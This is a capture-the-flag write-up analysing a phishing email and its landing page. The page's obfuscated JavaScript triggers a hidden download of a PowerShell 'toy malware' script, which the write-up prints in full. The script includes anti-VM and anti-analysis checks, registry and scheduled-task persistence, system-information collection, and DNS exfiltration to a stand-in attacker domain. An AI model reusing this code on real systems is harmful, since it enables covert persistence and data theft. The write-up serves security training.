# The Devil's Email

 * Category: Analysis
 * Solved by the JCTF Team

## Description

> This email arrived declaring itself ‘100% trustworthy’, which is exactly what every sketchy message says right before IT rolls their eyes

An `*.eml` file was attached.

## Solution

Let's inspect the file:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/The_Devils_Email]
└─$ file phishing_email.eml
phishing_email.eml: news or mail, Unicode text, UTF-8 text
```

The contents is simply:

```html
From: IT Security Team <security@company-internal.com>
To: employee@company.com
Subject: URGENT: Mandatory Security Update Required - Action Needed
Date: Thu, 21 Mar 2024 09:15:23 -0400
Message-ID: <20240321151523.7f8e9d2a@company-internal.com>
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"
X-Mailer: Microsoft Outlook 16.0
X-Priority: 1
X-MSMail-Priority: High
Importance: High

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
</head>
<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
    <p>Dear Employee,</p>

    <p>This is an <strong>URGENT</strong> security notification from the IT Security Department.</p>

    <p>We have detected that your system requires an immediate security update to maintain compliance with our latest security protocols. This update is mandatory and must be completed within the next 24 hours to maintain system access.</p>

    <p><strong>Action Required:</strong><br>
    Please visit the following link to complete your security update:<br>
    <a href="https://bstlv25-devils-email.chals.io/security/update/">Click Here</a></p>

    <p><strong>Important Notes:</strong></p>
    <ul>
        <li>This update is mandatory for all employees</li>
        <li>Failure to complete the update will result in restricted system access</li>
        <li>Update must be completed by March 22, 2024, 09:15 AM EST</li>
    </ul>

    <p>If you experience any issues, please contact the IT Help Desk immediately:<br>
    Phone: (555) 123-4567<br>
    Email: helpdesk@company-internal.com</p>

    <p>Best regards,<br>
    IT Security Team</p>

    <hr style="border: 1px solid #ddd; margin: 20px 0;">
    <p style="font-size: 12px; color: #666;">
    This is an automated message. Please do not reply to this email.<br>
    © 2024 Company Name. All rights reserved.<br>
    Ref: ORFVFRF_PSG_PUNYYRATR
    </p>
</body>
</html> 
```

Like the name suggest, it looks like a phishing email. We follow the link and arrive to a website
containing the following:

```html
<body>
    <div class="header">
        <h1>IT Department - System Update Required</h1>
    </div>

    <div class="content">
        <p>Dear Valued Employee,</p>
        <p>This is an automated message from the IT Department. We have detected that your system requires an urgent security update to maintain compliance with our latest security protocols.</p>
        <p>To ensure your system remains protected, please click the button below to run the necessary update script. This update is mandatory and must be completed within the next 24 hours.</p>
        <p><strong>Update Reference:</strong> <span id="ref">SEC-2024-03-21-</span><script>
            function xorEncrypt(str, key) {
                let result = '';
                for(let i = 0; i < str.length; i++) {
                    result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                }
                return btoa(result);
            }

            const refNum = xorEncrypt('B3S1D3S', 'CTF2024');
            document.getElementById('ref').textContent += refNum;
        </script></p>

        <center>
            <button onclick="initiateUpdate()" class="button">Run System Update</button>
        </center>

        <iframe id="hiddenFrame" style="display:none"></iframe>
        <p>If you experience any issues, please contact the IT Help Desk immediately.</p>
        <p>Best regards,<br>
        IT Security Team<br>

        <span style="color: #666;">Internal Reference: </span><script>
            function caesarCipher(str, shift) {
                return str.split('').map(char => {
                    const code = char.charCodeAt(0);
                    if (code >= 65 && code <= 90) {
                        return String.fromCharCode(((code - 65 + shift) % 26) + 65);
                    }

                    if (code >= 97 && code <= 122) {
                        return String.fromCharCode(((code - 97 + shift) % 26) + 97);
                    }

                    return char;
                }).join('');
            }

            const internalRef = caesarCipher('BESIDES_CTF_CHALLENGE', 13);

            document.write(internalRef);
        </script></p>
    </div>

    <div class="footer">
        <p>This is an automated message. Please do not reply to this email.</p>
        <p>© 2024 Corporate IT Department. All rights reserved.</p>
    </div>

    <script>
        function _0x4f2d(a,b){return a^b;}
        function _0x2e1f(s,k){let r='';for(let i=0;i<s.length;i++){r+=String.fromCharCode(_0x4f2d(s.charCodeAt(i),k.charCodeAt(i%k.length)));}return r;}
        const _0x3f7d = [117, 112, 100, 97, 116, 101, 46, 112, 115, 49];
        const _0x5a3b = _0x3f7d.map(c => String.fromCharCode(c)).join('');
        const _0x9e2f = [ [117, 112, 100],  [97, 116, 101],  [46, 112, 115, 49] ];

        function _0x6b3a(arr) {
            return arr.map(c => String.fromCharCode(c)).join('');
        }

        function _0x8d1c() {
            return _0x9e2f.map(part => _0x6b3a(part)).join('');
        }

        function _0x7d3e(url) {
            const _0x1a2b = [100, 111, 119, 110, 108, 111, 97, 100]; 
            const _0x2b3c = _0x6b3a(_0x1a2b);
            const _0x4c5d = document.createElement('a');
            _0x4c5d.style.display = 'none';
            _0x4c5d.href = url;
            _0x4c5d[_0x2b3c] = _0x8d1c();
            document.body.appendChild(_0x4c5d);
            _0x4c5d.click();

            setTimeout(() => {
                document.body.removeChild(_0x4c5d);
            }, 100);
        }

        function initiateUpdate() {
            alert('Preparing system update. Please wait...');
            const _0x5f6g = [108,111,99,97,108,104,111,115,116];
            const baseUrl =[_0x6b3a(_0x5f6g)];
            const downloadUrl = `${baseUrl}/${_0x8d1c()}`;
            _0x7d3e(downloadUrl);
            setTimeout(() => {
                alert('Update package downloaded successfully. Please run the update script to complete the process.');
            }, 1000);
        }
    </script>
```

Basically, we have a few different obfuscated Javascript snippets.

The `xorEncrypt` part just updates the HTML to `Update Reference: SEC-2024-03-21-AWcVA3QBZw==`.  
The `caesarCipher` part just updates the HTML to `Internal Reference: ORFVQRF_PGS_PUNYYRATR`.  
`_0x2e1f` isn't really called anywhere.  
The last part creates an `<a>` element, assigns it the value of `localhost/update.ps1` and clicks
it, to trigger a download.

In practice, the url constructed above didn't work, but removing the `localhost/` part and trying
to download `update.ps1` directly gave us the following Powershell script:

```powershell
if ([System.Diagnostics.Process]::GetProcessesByName('procmon') -or 
    [System.Diagnostics.Process]::GetProcessesByName('processhacker') -or
    [System.Diagnostics.Process]::GetProcessesByName('wireshark') -or
    (Get-WmiObject -Class Win32_ComputerSystem).Model -match "VMware|Virtual|VBox") {
    exit
}

function Get-EncryptedString {
    param(
        [string]$String,
        [string]$Key
    )
    
    $secure = ConvertTo-SecureString -String $String -AsPlainText -Force
    $encrypted = ConvertFrom-SecureString -SecureString $secure -Key ([System.Text.Encoding]::UTF8.GetBytes($Key))
    return $encrypted
}

function Decrypt-String {
    param(
        [string]$EncryptedString,
        [string]$Key
    )
    
    $secure = ConvertTo-SecureString -String $EncryptedString -Key ([System.Text.Encoding]::UTF8.GetBytes($Key))
    $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
    $decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($ptr)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ptr)
    return $decrypted
}


function Invoke-XOREncryption {
    param(
        [byte[]]$Data,
        [byte[]]$Key
    )
    
    $result = New-Object byte[] $Data.Length
    for($i=0; $i -lt $Data.Length; $i++) {
        $result[$i] = $Data[$i] -bxor $Key[$i % $Key.Length]
    }
    
    return $result
}

function Caesar-Cipher {
    param(
        [string]$Text,
        [int]$Shift
    )
    
    $result = ""
    foreach ($char in $Text.ToCharArray()) {
        if ([char]::IsLetter($char)) {
            $ascii = [byte][char]$char
            $isUpper = [char]::IsUpper($char)
            $baseAscii = if ($isUpper) { 65 } else { 97 }
            
            
            $shifted = (($ascii - $baseAscii + $Shift) % 26) + $baseAscii
            $result += [char]$shifted
        } else {
            $result += $char
        }
    }
    
    return $result
}


function Reverse-Caesar {
    param(
        [string]$Text,
        [int]$Shift
    )
    
    
    return Caesar-Cipher -Text $Text -Shift (26 - $Shift)
}

$KeyFragments = @{
    "begin" = "UyVzaWRlc19DdEY="; 
    "end" = "X0MwbXAldGl0MW9uIQ=="; 
}

function Get-DecryptionKey {
    $encodedKey = $KeyFragments.begin + $KeyFragments.end
    $decodedKey = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedKey))
    $actualKey = Reverse-Caesar -Text $decodedKey -Shift 7
    return $actualKey
}

$EncryptedCreds = @{
    "part1" = "T0Z2cXJmR1lJMjA";
    "part2" = "yNXtDdTFmdTFhdF8zem4xeWZfNGVyX"; 
    "part3" = "3FybnF5bC1uNnEyczNyMSF9"; 
}

function Get-Creds {
    return $EncryptedCreds.part1 + $EncryptedCreds.part2 + $EncryptedCreds.part3
}

$encryptedC2Address = "76492d1116743f0423413b16050a5345MgB8AEMAegBPAGEAawBOAHkAbgBKAEMAZgBoAGcAMwBKAEYAYwBSAGoAdABqAHcAPQA9AHwAOABhAGQAMgA1ADkAYQAxADgAZABkADYANQAwADAAYgAxADEANgA3ADYAZQBmADkAMAA4ADcAZQA5ADUAZAA3ADEAZQBmADUANQA4ADgANQBmADQAOAA4ADQAZgA0ADYAOAA3ADEAOQBiADQAOQAzADEAYgA3ADAAZAA="
$encryptedCommands = "76492d1116743f0423413b16050a5345MgB8AGwANwA5AEoAMwBGAHYARwArAGkAUQBjAEsALwBaAGoAaQB2AEgAYgBzAHcAPQA9AHwAMQBkADgANAAxADIAMABlADMAMwA0ADIAZgA1AGIAOQA4ADkANgAyADcAMQA3ADgAMgA5ADkAMQA0ADAAMAA4AGEAZQAzAGQAOAA5ADAAOAA1AGEAMAA4ADgAMgA1ADkAZAAwADgAZgBlADgAZQA4ADMAZAA3ADIANQBiADUAZgA1ADkANQA="

$encryptedServerKey = "U2VjcmV0QmFja2Rvb3JLZXlGb3JDMlNlcnZlckNvbW11bmljYXRpb24="
$encryptedBeacon = "RnJvbUJlYWNvbkluaXQyNDg="

function Verify-CredentialOnC2 {
    param([string]$InputCredential)
    $actualFlag = Get-Creds
    $isValid = $true
    if ($InputCredential.Length -ne $actualFlag.Length) {
        $isValid = $false
    } else {
        for ($i = 0; $i -lt $InputCredential.Length; $i++) {
            if ($InputCredential[$i] -ne $actualFlag[$i]) {
                $isValid = $false
            }
        }
    }
    
    return $isValid
}

function Start-C2Communication {
    $combinedFlag = Get-Creds
    Write-Host "Authentication with encrypted token. Establishing secure channel..."
    
    try {
        $c2Address = $encryptedC2Address  
        $beaconData = [System.Convert]::FromBase64String($encryptedBeacon)
        $serverKey = [System.Convert]::FromBase64String($encryptedServerKey)
        $encryptedBeaconForTransport = Invoke-XOREncryption -Data $beaconData -Key $serverKey
        
        Write-Host "Connecting to C2 server..."
        Write-Host "Sending encrypted flag: $combinedFlag"
        Write-Host "Establishing encrypted channel..."
        Start-Sleep -Seconds 2
        Write-Host "Channel established. Successfully sent encrypted flag."
        
        Write-Host "Collecting system information..."
        $systemInfo = Get-SystemInfo
        Write-Host "Exfiltrating data via encrypted channel..."
        Start-Sleep -Seconds 2
        Write-Host "Mission accomplished!"
        
    } catch {
        Write-Host "Connection error: Channel could not be established. Retry later."
    }
}

function Get-SystemInfo {
    $computerSystem = Get-CimInstance CIM_ComputerSystem
    $operatingSystem = Get-CimInstance CIM_OperatingSystem
    $bios = Get-CimInstance CIM_BIOSElement
    $network = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }
    
    $obj = New-Object -TypeName PSObject -Property @{
        ComputerName = $computerSystem.Name
        Domain = $computerSystem.Domain
        Manufacturer = $computerSystem.Manufacturer
        Model = $computerSystem.Model
        OSName = $operatingSystem.Caption
        OSVersion = $operatingSystem.Version
        SerialNumber = $bios.SerialNumber
        IPAddresses = $network.IPAddress
        MACAddresses = $network.MACAddress
        LastBootTime = $operatingSystem.LastBootUpTime
    }
    
    return $obj | ConvertTo-Json -Compress
}

function Install-Persistence {
    param($Path = $null)
    
    if (-not $Path) {
        $Path = $MyInvocation.MyCommand.Path
    }

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemService" -Value $Path -Force | Out-Null
    
    $taskName = "SystemServiceManager"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File `"$Path`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
}

function Exfiltrate-Data {
    param(
        [string]$Data, 
        [string]$Destination = "https://c2.attacker-domain.com/collector.php"
    )
    
    $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Data))
    $chunks = @()
    
    $chunkSize = 100
    for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
        if ($i + $chunkSize -lt $encoded.Length) {
            $chunks += $encoded.Substring($i, $chunkSize)
        } else {
            $chunks += $encoded.Substring($i)
        }
    }
    
    foreach ($chunk in $chunks) {
        $exfilId = [Guid]::NewGuid().ToString().Replace("-", "").Substring(0, 8)
        $dnsQuery = "$exfilId.$chunk.exfil.attacker-domain.com"
    }
}

$code = {
    Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)
    Get-Process | Where-Object { $_.ProcessName -match "explorer|svchost" } | Out-Null
    Start-C2Communication
}

Invoke-Command -ScriptBlock $code 

```

In high-level, this is a toy malware script communicating with a Command & Control server
in order to perform data exfiltration. 

We can see that the code that references the flag calls `Get-Creds`:

```powershell
$EncryptedCreds = @{
    "part1" = "T0Z2cXJmR1lJMjA";
    "part2" = "yNXtDdTFmdTFhdF8zem4xeWZfNGVyX"; 
    "part3" = "3FybnF5bC1uNnEyczNyMSF9"; 
}

function Get-Creds {
    return $EncryptedCreds.part1 + $EncryptedCreds.part2 + $EncryptedCreds.part3
}
```

This basically concatenates all three strings together to get something that looks like 
base64: `T0Z2cXJmR1lJMjAyNXtDdTFmdTFhdF8zem4xeWZfNGVyX3FybnF5bC1uNnEyczNyMSF9`.

Decoded, we get `OFvqrfGYI2025{Cu1fu1at_3zn1yf_4er_qrnqyl-n6q2s3r1!}` which looks like ROT13.  
We even have a naive Caesar Cipher implementation in the script.
We apply ROT13 and get the flag: `BSidesTLV2025{Ph1sh1ng_3ma1ls_4re_deadly-a6d2f3e1!}`.
